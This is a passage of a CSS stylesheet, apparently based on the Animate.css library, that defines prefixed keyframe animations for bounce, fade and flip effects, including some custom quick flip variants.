    animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
  }

  0% {
    opacity: 0;
    -webkit-transform: translate3d(0, -3000px, 0);
    transform: translate3d(0, -3000px, 0);
  }

  60% {
    opacity: 1;
    -webkit-transform: translate3d(0, 25px, 0);
    transform: translate3d(0, 25px, 0);
  }

  75% {
    -webkit-transform: translate3d(0, -10px, 0);
    transform: translate3d(0, -10px, 0);
  }

  90% {
    -webkit-transform: translate3d(0, 5px, 0);
    transform: translate3d(0, 5px, 0);
  }

  to {
    -webkit-transform: none;
    transform: none;
  }
}

@keyframes bounceInDown {
  from, 60%, 75%, 90%, to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
    animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
  }

  0% {
    opacity: 0;
    -webkit-transform: translate3d(0, -3000px, 0);
    transform: translate3d(0, -3000px, 0);
  }

  60% {
    opacity: 1;
    -webkit-transform: translate3d(0, 25px, 0);
    transform: translate3d(0, 25px, 0);
  }

  75% {
    -webkit-transform: translate3d(0, -10px, 0);
    transform: translate3d(0, -10px, 0);
  }

  90% {
    -webkit-transform: translate3d(0, 5px, 0);
    transform: translate3d(0, 5px, 0);
  }

  to {
    -webkit-transform: none;
    transform: none;
  }
}

.bounceInDown {
  -webkit-animation-name: bounceInDown;
  animation-name: bounceInDown;
}

@-webkit-keyframes bounceInLeft {
  from, 60%, 75%, 90%, to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
    animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
  }

  0% {
    opacity: 0;
    -webkit-transform: translate3d(-3000px, 0, 0);
    transform: translate3d(-3000px, 0, 0);
  }

  60% {
    opacity: 1;
    -webkit-transform: translate3d(25px, 0, 0);
    transform: translate3d(25px, 0, 0);
  }

  75% {
    -webkit-transform: translate3d(-10px, 0, 0);
    transform: translate3d(-10px, 0, 0);
  }

  90% {
    -webkit-transform: translate3d(5px, 0, 0);
    transform: translate3d(5px, 0, 0);
  }

  to {
    -webkit-transform: none;
    transform: none;
  }
}

@keyframes bounceInLeft {
  from, 60%, 75%, 90%, to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
    animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
  }

  0% {
    opacity: 0;
    -webkit-transform: translate3d(-3000px, 0, 0);
    transform: translate3d(-3000px, 0, 0);
  }

  60% {
    opacity: 1;
    -webkit-transform: translate3d(25px, 0, 0);
    transform: translate3d(25px, 0, 0);
  }

  75% {
    -webkit-transform: translate3d(-10px, 0, 0);
    transform: translate3d(-10px, 0, 0);
  }

  90% {
    -webkit-transform: translate3d(5px, 0, 0);
    transform: translate3d(5px, 0, 0);
  }

  to {
    -webkit-transform: none;
    transform: none;
  }
}

.bounceInLeft {
  -webkit-animation-name: bounceInLeft;
  animation-name: bounceInLeft;
}

@-webkit-keyframes bounceInRight {
  from, 60%, 75%, 90%, to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
    animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
  }

  from {
    opacity: 0;
    -webkit-transform: translate3d(3000px, 0, 0);
    transform: translate3d(3000px, 0, 0);
  }

  60% {
    opacity: 1;
    -webkit-transform: translate3d(-25px, 0, 0);
    transform: translate3d(-25px, 0, 0);
  }

  75% {
    -webkit-transform: translate3d(10px, 0, 0);
    transform: translate3d(10px, 0, 0);
  }

  90% {
    -webkit-transform: translate3d(-5px, 0, 0);
    transform: translate3d(-5px, 0, 0);
  }

  to {
    -webkit-transform: none;
    transform: none;
  }
}

@keyframes bounceInRight {
  from, 60%, 75%, 90%, to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
    animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
  }

  from {
    opacity: 0;
    -webkit-transform: translate3d(3000px, 0, 0);
    transform: translate3d(3000px, 0, 0);
  }

  60% {
    opacity: 1;
    -webkit-transform: translate3d(-25px, 0, 0);
    transform: translate3d(-25px, 0, 0);
  }

  75% {
    -webkit-transform: translate3d(10px, 0, 0);
    transform: translate3d(10px, 0, 0);
  }

  90% {
    -webkit-transform: translate3d(-5px, 0, 0);
    transform: translate3d(-5px, 0, 0);
  }

  to {
    -webkit-transform: none;
    transform: none;
  }
}

.bounceInRight {
  -webkit-animation-name: bounceInRight;
  animation-name: bounceInRight;
}

@-webkit-keyframes bounceInUp {
  from, 60%, 75%, 90%, to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
    animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
  }

  from {
    opacity: 0;
    -webkit-transform: translate3d(0, 3000px, 0);
    transform: translate3d(0, 3000px, 0);
  }

  60% {
    opacity: 1;
    -webkit-transform: translate3d(0, -20px, 0);
    transform: translate3d(0, -20px, 0);
  }

  75% {
    -webkit-transform: translate3d(0, 10px, 0);
    transform: translate3d(0, 10px, 0);
  }

  90% {
    -webkit-transform: translate3d(0, -5px, 0);
    transform: translate3d(0, -5px, 0);
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

@keyframes bounceInUp {
  from, 60%, 75%, 90%, to {
    -webkit-animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
    animation-timing-function: cubic-bezier(0.215, 0.610, 0.355, 1.000);
  }

  from {
    opacity: 0;
    -webkit-transform: translate3d(0, 3000px, 0);
    transform: translate3d(0, 3000px, 0);
  }

  60% {
    opacity: 1;
    -webkit-transform: translate3d(0, -20px, 0);
    transform: translate3d(0, -20px, 0);
  }

  75% {
    -webkit-transform: translate3d(0, 10px, 0);
    transform: translate3d(0, 10px, 0);
  }

  90% {
    -webkit-transform: translate3d(0, -5px, 0);
    transform: translate3d(0, -5px, 0);
  }

  to {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }
}

.bounceInUp {
  -webkit-animation-name: bounceInUp;
  animation-name: bounceInUp;
}

@-webkit-keyframes bounceOut {
  20% {
    -webkit-transform: scale3d(.9, .9, .9);
    transform: scale3d(.9, .9, .9);
  }

  50%, 55% {
    opacity: 1;
    -webkit-transform: scale3d(1.1, 1.1, 1.1);
    transform: scale3d(1.1, 1.1, 1.1);
  }

  to {
    opacity: 0;
    -webkit-transform: scale3d(.3, .3, .3);
    transform: scale3d(.3, .3, .3);
  }
}

@keyframes bounceOut {
  20% {
    -webkit-transform: scale3d(.9, .9, .9);
    transform: scale3d(.9, .9, .9);
  }

  50%, 55% {
    opacity: 1;
    -webkit-transform: scale3d(1.1, 1.1, 1.1);
    transform: scale3d(1.1, 1.1, 1.1);
  }

  to {
    opacity: 0;
    -webkit-transform: scale3d(.3, .3, .3);
    transform: scale3d(.3, .3, .3);
  }
}

.bounceOut {
  -webkit-animation-name: bounceOut;
  animation-name: bounceOut;
}

@-webkit-keyframes bounceOutDown {
  20% {
    -webkit-transform: translate3d(0, 10px, 0);
    transform: translate3d(0, 10px, 0);
  }

  40%, 45% {
    opacity: 1;
    -webkit-transform: translate3d(0, -20px, 0);
    transform: translate3d(0, -20px, 0);
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(0, 2000px, 0);
    transform: translate3d(0, 2000px, 0);
  }
}

@keyframes bounceOutDown {
  20% {
    -webkit-transform: translate3d(0, 10px, 0);
    transform: translate3d(0, 10px, 0);
  }

  40%, 45% {
    opacity: 1;
    -webkit-transform: translate3d(0, -20px, 0);
    transform: translate3d(0, -20px, 0);
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(0, 2000px, 0);
    transform: translate3d(0, 2000px, 0);
  }
}

.bounceOutDown {
  -webkit-animation-name: bounceOutDown;
  animation-name: bounceOutDown;
}

@-webkit-keyframes bounceOutLeft {
  20% {
    opacity: 1;
    -webkit-transform: translate3d(20px, 0, 0);
    transform: translate3d(20px, 0, 0);
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(-2000px, 0, 0);
    transform: translate3d(-2000px, 0, 0);
  }
}

@keyframes bounceOutLeft {
  20% {
    opacity: 1;
    -webkit-transform: translate3d(20px, 0, 0);
    transform: translate3d(20px, 0, 0);
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(-2000px, 0, 0);
    transform: translate3d(-2000px, 0, 0);
  }
}

.bounceOutLeft {
  -webkit-animation-name: bounceOutLeft;
  animation-name: bounceOutLeft;
}

@-webkit-keyframes bounceOutRight {
  20% {
    opacity: 1;
    -webkit-transform: translate3d(-20px, 0, 0);
    transform: translate3d(-20px, 0, 0);
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(2000px, 0, 0);
    transform: translate3d(2000px, 0, 0);
  }
}

@keyframes bounceOutRight {
  20% {
    opacity: 1;
    -webkit-transform: translate3d(-20px, 0, 0);
    transform: translate3d(-20px, 0, 0);
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(2000px, 0, 0);
    transform: translate3d(2000px, 0, 0);
  }
}

.bounceOutRight {
  -webkit-animation-name: bounceOutRight;
  animation-name: bounceOutRight;
}

@-webkit-keyframes bounceOutUp {
  20% {
    -webkit-transform: translate3d(0, -10px, 0);
    transform: translate3d(0, -10px, 0);
  }

  40%, 45% {
    opacity: 1;
    -webkit-transform: translate3d(0, 20px, 0);
    transform: translate3d(0, 20px, 0);
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(0, -2000px, 0);
    transform: translate3d(0, -2000px, 0);
  }
}

@keyframes bounceOutUp {
  20% {
    -webkit-transform: translate3d(0, -10px, 0);
    transform: translate3d(0, -10px, 0);
  }

  40%, 45% {
    opacity: 1;
    -webkit-transform: translate3d(0, 20px, 0);
    transform: translate3d(0, 20px, 0);
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(0, -2000px, 0);
    transform: translate3d(0, -2000px, 0);
  }
}

.bounceOutUp {
  -webkit-animation-name: bounceOutUp;
  animation-name: bounceOutUp;
}

@-webkit-keyframes fadeIn {
  from {
    opacity: 0;
  }

  to {
    opacity: 1;
  }
}

@keyframes fadeIn {
  from {
    opacity: 0;
  }

  to {
    opacity: 1;
  }
}

.fadeIn {
  -webkit-animation-name: fadeIn;
  animation-name: fadeIn;
}

@-webkit-keyframes fadeInDown {
  from {
    opacity: 0;
    -webkit-transform: translate3d(0, -100%, 0);
    transform: translate3d(0, -100%, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

@keyframes fadeInDown {
  from {
    opacity: 0;
    -webkit-transform: translate3d(0, -100%, 0);
    transform: translate3d(0, -100%, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

.fadeInDown {
  -webkit-animation-name: fadeInDown;
  animation-name: fadeInDown;
}

@-webkit-keyframes fadeInDownBig {
  from {
    opacity: 0;
    -webkit-transform: translate3d(0, -2000px, 0);
    transform: translate3d(0, -2000px, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

@keyframes fadeInDownBig {
  from {
    opacity: 0;
    -webkit-transform: translate3d(0, -2000px, 0);
    transform: translate3d(0, -2000px, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

.fadeInDownBig {
  -webkit-animation-name: fadeInDownBig;
  animation-name: fadeInDownBig;
}

@-webkit-keyframes fadeInLeft {
  from {
    opacity: 0;
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

@keyframes fadeInLeft {
  from {
    opacity: 0;
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

.fadeInLeft {
  -webkit-animation-name: fadeInLeft;
  animation-name: fadeInLeft;
}

@-webkit-keyframes fadeInLeftBig {
  from {
    opacity: 0;
    -webkit-transform: translate3d(-2000px, 0, 0);
    transform: translate3d(-2000px, 0, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

@keyframes fadeInLeftBig {
  from {
    opacity: 0;
    -webkit-transform: translate3d(-2000px, 0, 0);
    transform: translate3d(-2000px, 0, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

.fadeInLeftBig {
  -webkit-animation-name: fadeInLeftBig;
  animation-name: fadeInLeftBig;
}

@-webkit-keyframes fadeInRight {
  from {
    opacity: 0;
    -webkit-transform: translate3d(100%, 0, 0);
    transform: translate3d(100%, 0, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

@keyframes fadeInRight {
  from {
    opacity: 0;
    -webkit-transform: translate3d(100%, 0, 0);
    transform: translate3d(100%, 0, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

.fadeInRight {
  -webkit-animation-name: fadeInRight;
  animation-name: fadeInRight;
}

@-webkit-keyframes fadeInRightBig {
  from {
    opacity: 0;
    -webkit-transform: translate3d(2000px, 0, 0);
    transform: translate3d(2000px, 0, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

@keyframes fadeInRightBig {
  from {
    opacity: 0;
    -webkit-transform: translate3d(2000px, 0, 0);
    transform: translate3d(2000px, 0, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

.fadeInRightBig {
  -webkit-animation-name: fadeInRightBig;
  animation-name: fadeInRightBig;
}

@-webkit-keyframes fadeInUp {
  from {
    opacity: 0;
    -webkit-transform: translate3d(0, 100%, 0);
    transform: translate3d(0, 100%, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

@keyframes fadeInUp {
  from {
    opacity: 0;
    -webkit-transform: translate3d(0, 100%, 0);
    transform: translate3d(0, 100%, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

.fadeInUp {
  -webkit-animation-name: fadeInUp;
  animation-name: fadeInUp;
}

@-webkit-keyframes fadeInUpBig {
  from {
    opacity: 0;
    -webkit-transform: translate3d(0, 2000px, 0);
    transform: translate3d(0, 2000px, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

@keyframes fadeInUpBig {
  from {
    opacity: 0;
    -webkit-transform: translate3d(0, 2000px, 0);
    transform: translate3d(0, 2000px, 0);
  }

  to {
    opacity: 1;
    -webkit-transform: none;
    transform: none;
  }
}

.fadeInUpBig {
  -webkit-animation-name: fadeInUpBig;
  animation-name: fadeInUpBig;
}

@-webkit-keyframes fadeOut {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
  }
}

@keyframes fadeOut {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
  }
}

.fadeOut {
  -webkit-animation-name: fadeOut;
  animation-name: fadeOut;
}

@-webkit-keyframes fadeOutDown {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(0, 100%, 0);
    transform: translate3d(0, 100%, 0);
  }
}

@keyframes fadeOutDown {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(0, 100%, 0);
    transform: translate3d(0, 100%, 0);
  }
}

.fadeOutDown {
  -webkit-animation-name: fadeOutDown;
  animation-name: fadeOutDown;
}

@-webkit-keyframes fadeOutDownBig {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(0, 2000px, 0);
    transform: translate3d(0, 2000px, 0);
  }
}

@keyframes fadeOutDownBig {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(0, 2000px, 0);
    transform: translate3d(0, 2000px, 0);
  }
}

.fadeOutDownBig {
  -webkit-animation-name: fadeOutDownBig;
  animation-name: fadeOutDownBig;
}

@-webkit-keyframes fadeOutLeft {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
  }
}

@keyframes fadeOutLeft {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(-100%, 0, 0);
    transform: translate3d(-100%, 0, 0);
  }
}

.fadeOutLeft {
  -webkit-animation-name: fadeOutLeft;
  animation-name: fadeOutLeft;
}

@-webkit-keyframes fadeOutLeftBig {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(-2000px, 0, 0);
    transform: translate3d(-2000px, 0, 0);
  }
}

@keyframes fadeOutLeftBig {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(-2000px, 0, 0);
    transform: translate3d(-2000px, 0, 0);
  }
}

.fadeOutLeftBig {
  -webkit-animation-name: fadeOutLeftBig;
  animation-name: fadeOutLeftBig;
}

@-webkit-keyframes fadeOutRight {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(100%, 0, 0);
    transform: translate3d(100%, 0, 0);
  }
}

@keyframes fadeOutRight {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(100%, 0, 0);
    transform: translate3d(100%, 0, 0);
  }
}

.fadeOutRight {
  -webkit-animation-name: fadeOutRight;
  animation-name: fadeOutRight;
}

@-webkit-keyframes fadeOutRightBig {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(2000px, 0, 0);
    transform: translate3d(2000px, 0, 0);
  }
}

@keyframes fadeOutRightBig {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(2000px, 0, 0);
    transform: translate3d(2000px, 0, 0);
  }
}

.fadeOutRightBig {
  -webkit-animation-name: fadeOutRightBig;
  animation-name: fadeOutRightBig;
}

@-webkit-keyframes fadeOutUp {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(0, -100%, 0);
    transform: translate3d(0, -100%, 0);
  }
}

@keyframes fadeOutUp {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(0, -100%, 0);
    transform: translate3d(0, -100%, 0);
  }
}

.fadeOutUp {
  -webkit-animation-name: fadeOutUp;
  animation-name: fadeOutUp;
}

@-webkit-keyframes fadeOutUpBig {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(0, -2000px, 0);
    transform: translate3d(0, -2000px, 0);
  }
}

@keyframes fadeOutUpBig {
  from {
    opacity: 1;
  }

  to {
    opacity: 0;
    -webkit-transform: translate3d(0, -2000px, 0);
    transform: translate3d(0, -2000px, 0);
  }
}

.fadeOutUpBig {
  -webkit-animation-name: fadeOutUpBig;
  animation-name: fadeOutUpBig;
}

@-webkit-keyframes flip {
  from {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -360deg);
    transform: perspective(400px) rotate3d(0, 1, 0, -360deg);
    -webkit-animation-timing-function: ease-out;
    animation-timing-function: ease-out;
  }

  40% {
    -webkit-transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -190deg);
    transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -190deg);
    -webkit-animation-timing-function: ease-out;
    animation-timing-function: ease-out;
  }

  50% {
    -webkit-transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -170deg);
    transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -170deg);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
  }

  80% {
    -webkit-transform: perspective(400px) scale3d(.95, .95, .95);
    transform: perspective(400px) scale3d(.95, .95, .95);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
  }

  to {
    -webkit-transform: perspective(400px);
    transform: perspective(400px);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
  }
}

@keyframes flip {
  from {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -360deg);
    transform: perspective(400px) rotate3d(0, 1, 0, -360deg);
    -webkit-animation-timing-function: ease-out;
    animation-timing-function: ease-out;
  }

  40% {
    -webkit-transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -190deg);
    transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -190deg);
    -webkit-animation-timing-function: ease-out;
    animation-timing-function: ease-out;
  }

  50% {
    -webkit-transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -170deg);
    transform: perspective(400px) translate3d(0, 0, 150px) rotate3d(0, 1, 0, -170deg);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
  }

  80% {
    -webkit-transform: perspective(400px) scale3d(.95, .95, .95);
    transform: perspective(400px) scale3d(.95, .95, .95);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
  }

  to {
    -webkit-transform: perspective(400px);
    transform: perspective(400px);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
  }
}

.animated.flip {
  -webkit-backface-visibility: visible;
  backface-visibility: visible;
  -webkit-animation-name: flip;
  animation-name: flip;
}

@-webkit-keyframes flipInX {
  from {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
    opacity: 0;
  }

  40% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
  }

  60% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
    transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
    opacity: 1;
  }

  80% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -5deg);
    transform: perspective(400px) rotate3d(1, 0, 0, -5deg);
  }

  to {
    -webkit-transform: perspective(400px);
    transform: perspective(400px);
  }
}

@keyframes flipInX {
  from {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
    opacity: 0;
  }

  40% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
  }

  60% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
    transform: perspective(400px) rotate3d(1, 0, 0, 10deg);
    opacity: 1;
  }

  80% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -5deg);
    transform: perspective(400px) rotate3d(1, 0, 0, -5deg);
  }

  to {
    -webkit-transform: perspective(400px);
    transform: perspective(400px);
  }
}

.flipInX {
  -webkit-backface-visibility: visible !important;
  backface-visibility: visible !important;
  -webkit-animation-name: flipInX;
  animation-name: flipInX;
}

/************************************/

.animated.flipOutXX,
.animated.flipInXX,
.animated.flipInYY,
.animated.flipOutYY
{
  -webkit-animation-duration: .30s !important;
  animation-duration: .30s !important;
}

@-webkit-keyframes flipInXX {
  from {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 270deg);
    transform: perspective(400px) rotate3d(1, 0, 0, 270deg);
    -webkit-animation-timing-function: linear;
    animation-timing-function: linear;
    opacity: 0;
  }
  to {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 360deg);
    transform: perspective(400px) rotate3d(1, 0, 0, 360deg);
  }
}

@keyframes flipInXX {
  from {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 270deg);
    transform: perspective(400px) rotate3d(1, 0, 0, 270deg);
    -webkit-animation-timing-function: linear;
    animation-timing-function: linear;
    opacity: 0;
  }
  to {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 360deg);
    transform: perspective(400px) rotate3d(1, 0, 0, 360deg);
  }
}

.flipInXX {
  -webkit-backface-visibility: visible !important;
  backface-visibility: visible !important;
  -webkit-animation-name: flipInXX;
  animation-name: flipInXX;
}

@-webkit-keyframes flipOutXX {
  from {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 0deg);
    transform: perspective(400px) rotate3d(1, 0, 0, 0deg);
    -webkit-animation-timing-function: linear;
    animation-timing-function: linear;
  }
  to {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    opacity: 0;
  }
}

@keyframes flipOutXX {
  from {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 0deg);
    transform: perspective(400px) rotate3d(1, 0, 0, 0deg);
    -webkit-animation-timing-function: linear;
    animation-timing-function: linear;
  }
  to {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    opacity: 0;
  }
}

.flipOutXX {
  -webkit-backface-visibility: visible !important;
  backface-visibility: visible !important;
  -webkit-animation-name: flipOutXX;
  animation-name: flipOutXX;
}


@-webkit-keyframes flipInYY {
  from {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
    transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
    -webkit-animation-timing-function: ease-out;
    animation-timing-function: ease-out;
    opacity: 0;
  }
  to {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 360deg);
    transform: perspective(400px) rotate3d(0, 1, 0, 360deg);
  }
}

@keyframes flipInYY {
  from {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 270deg);
    transform: perspective(400px) rotate3d(0, 1, 0, 270deg);
    -webkit-animation-timing-function: ease-out;
    animation-timing-function: ease-out;
    opacity: 0;
  }
  to {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 360deg);
    transform: perspective(400px) rotate3d(0, 1, 0, 360deg);
  }
}

.flipInYY {
  -webkit-backface-visibility: visible !important;
  backface-visibility: visible !important;
  -webkit-animation-name: flipInYY;
  animation-name: flipInYY;
}


@-webkit-keyframes flipOutYY {
  from {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 0deg);
    transform: perspective(400px) rotate3d(0, 1, 0, 0deg);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
  }
  to {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
    transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
    opacity: 0;
  }
}

@keyframes flipOutYY {
  from {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 0deg);
    transform: perspective(400px) rotate3d(0, 1, 0, 0deg);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
  }
  to {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
    transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
    opacity: 0;
  }
}

.flipOutYY {
  -webkit-backface-visibility: visible !important;
  backface-visibility: visible !important;
  -webkit-animation-name: flipOutYY;
  animation-name: flipOutYY;
}










/**************************************/

@-webkit-keyframes flipInY {
  from {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
    transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
    opacity: 0;
  }

  40% {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -20deg);
    transform: perspective(400px) rotate3d(0, 1, 0, -20deg);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
  }

  60% {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 10deg);
    transform: perspective(400px) rotate3d(0, 1, 0, 10deg);
    opacity: 1;
  }

  80% {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -5deg);
    transform: perspective(400px) rotate3d(0, 1, 0, -5deg);
  }

  to {
    -webkit-transform: perspective(400px);
    transform: perspective(400px);
  }
}

@keyframes flipInY {
  from {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
    transform: perspective(400px) rotate3d(0, 1, 0, 90deg);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
    opacity: 0;
  }

  40% {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -20deg);
    transform: perspective(400px) rotate3d(0, 1, 0, -20deg);
    -webkit-animation-timing-function: ease-in;
    animation-timing-function: ease-in;
  }

  60% {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, 10deg);
    transform: perspective(400px) rotate3d(0, 1, 0, 10deg);
    opacity: 1;
  }

  80% {
    -webkit-transform: perspective(400px) rotate3d(0, 1, 0, -5deg);
    transform: perspective(400px) rotate3d(0, 1, 0, -5deg);
  }

  to {
    -webkit-transform: perspective(400px);
    transform: perspective(400px);
  }
}

.flipInY {
  -webkit-backface-visibility: visible !important;
  backface-visibility: visible !important;
  -webkit-animation-name: flipInY;
  animation-name: flipInY;
}

@-webkit-keyframes flipOutX {
  from {
    -webkit-transform: perspective(400px);
    transform: perspective(400px);
  }

  30% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
    opacity: 1;
  }

  to {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    transform: perspective(400px) rotate3d(1, 0, 0, 90deg);
    opacity: 0;
  }
}

@keyframes flipOutX {
  from {
    -webkit-transform: perspective(400px);
    transform: perspective(400px);
  }

  30% {
    -webkit-transform: perspective(400px) rotate3d(1, 0, 0, -20deg);
